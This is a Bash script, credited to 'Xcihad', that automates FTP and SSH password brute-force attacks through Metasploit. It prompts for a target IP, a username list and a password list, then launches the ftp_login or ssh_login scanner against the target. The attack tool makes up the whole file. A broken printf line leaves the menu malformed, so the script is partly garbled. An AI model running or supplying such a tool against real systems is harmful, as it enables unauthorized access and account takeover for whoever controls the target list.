#! /bin/bash
# Author : Xcihad

clear

dependencies() {
echo ""
command -v msfconsole > /dev/null 2>&1 || { printf >&2 "$kirmizi Please install metasploit and try again. Aborting."; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi

}

kirmizi="\e[31m"
yesil="\e[32m"
sari="\e[33m"
mavi="\e[36m"
mor="\e[34m"
beyaz="\033[1;37m"
reset="\e[0m"
author="\e[33mAuthor : \e[31mX\e[32mcihad \e[31mV1.0\e[0m"

banner(){
printf "\n"
printf "\n"
printf "     $mor██████  ██████  ██    ██ ████████ ███████      ██$reset \n"
printf "     $mor██   ██ ██   ██ ██    ██    ██    ██           ██$reset \n"
printf "     $mor██████  ██████  ██    ██    ██    █████        ██$reset \n"
printf "     $mor██   ██ ██   ██ ██    ██    ██    ██      ██   ██$reset \n"
printf "     $mor██████  ██   ██  ██████     ██    ███████  █████ $reset \n"
printf "\n"
printf "\n"
printf "\e[1;77m\e[41m    FTP/SSH Bruteforce attack automation with Metasploit \e[0m\n"
printf "\n"
printf "\n"
printf "     ${author}\n"
printf "\n"
printf "
printf "  read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" Enter your choice : "$kirmizi)"\n" cihad
}
banner
if [[ $cihad == 1 || $cihad == 01 ]]; then
        echo ""
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" RHOST address : "$kirmizi)" ip
        sleep 1
        printf "\n"
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of users : "$kirmizi)" listuser
        printf "\n"
        sleep 1
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of passwords : "$kirmizi) " listpass
        printf "\n"
        printf $" --->$sari Necessary actions are being taken...\n"
        sleep 2
        echo ""
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of users: $listuser\n"
        sleep 1
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of passwords: $listpass\n"
        sleep 2
        clear
        printf "\n"
        printf $" --->$sari Starting attack on $ip address\n"
        printf "\n"
        sleep 3 

        msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $ip ; set USER_FILE $listuser ; set PASS_FILE $listpass ; exploit ; "

elif [[ $cihad == 2 || $cihad == 02 ]]; then
        echo ""
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" RHOST address : "$kirmizi)" ip
        sleep 1
        printf "\n"
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of users : "$kirmizi)" listuser
        printf "\n"
        sleep 1
        read -p "$(echo -e $kirmizi[$yesil+$kirmizi]$sari" List of passwords : "$kirmizi) " listpass
        printf "\n"
        printf $" --->$sari Necessary actions are being taken...\n"
        sleep 2
        echo ""
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of users: $listuser\n"
        sleep 1
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of passwords: $listpass\n"
        sleep 2
        clear
        printf "\n"
        printf $" --->$sari Starting attack on $ip address\n"
        printf "\n"
        sleep 3

msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $ip ; set USER_FILE $listuser ; set PASS_FILE $listpass ; exploit ; "

else
        printf "\n"
        printf "$beyaz--> $kirmizi Wrong choice !\n"
        sleep 2
        bash brute.sh
fi
